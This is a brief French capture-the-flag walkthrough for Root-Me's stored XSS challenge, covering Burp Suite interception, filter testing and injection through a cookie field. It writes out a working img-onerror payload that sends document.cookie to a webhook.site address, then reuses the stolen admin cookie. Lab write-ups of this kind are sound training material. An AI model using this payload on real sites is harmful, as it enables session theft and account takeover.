Write-up Root-Me XSS Stockée 2

1. Ouvrir le challenge Root-Me XSS Stockée 2 

2.Ouvrir burpsuite et intercepté les requêtes

3. Tester une balise HTML :
Dans l'entrée titre et message:<b>test</b>

4. Vérifier que "<script>" est filtré :
Dans l'entrée titre:test
Dans l'entrée message:<script>alert(1)<A/script>

5.Envoyer la requête avec "<script>alert(1)</script>" à intruder


6. Utiliser un event handler XSS :

Ajouter <img src=1 onerror=alert(1)> au niveau de Cookie: status=invite

resultat:status=invite"><img src=1 onerror="alert(1)" /> 



7. Créer un webhook sur [Webhook.site](https://webhook.site?utm_source=chatgpt.com)



8. Remplacer `alert(1)` par une exfiltration :

ex:<img src=1 onerror="window.location='https://webhook.site/8443c7da-3514-4e39-a55d-4b1f8e8546eb?cookie='+document.cookie" />


9. Poster le message.

resultat:status=invite"><img src=1 onerror="window.location='https://webhook.site/8443c7da-3514-4e39-a55d-4b1f8e8546eb?cookie='+document.cookie" />


10. Sur burpsuite appuyer sur send et aller sur la page et actualiser .

11. Regarder les requêtes reçues sur Webhook.site.

12. Récupérer le cookie/flag envoyé par l’administrateur.

13. Inserer le cookie sur sur burpsuite au niveau de cookie puis send


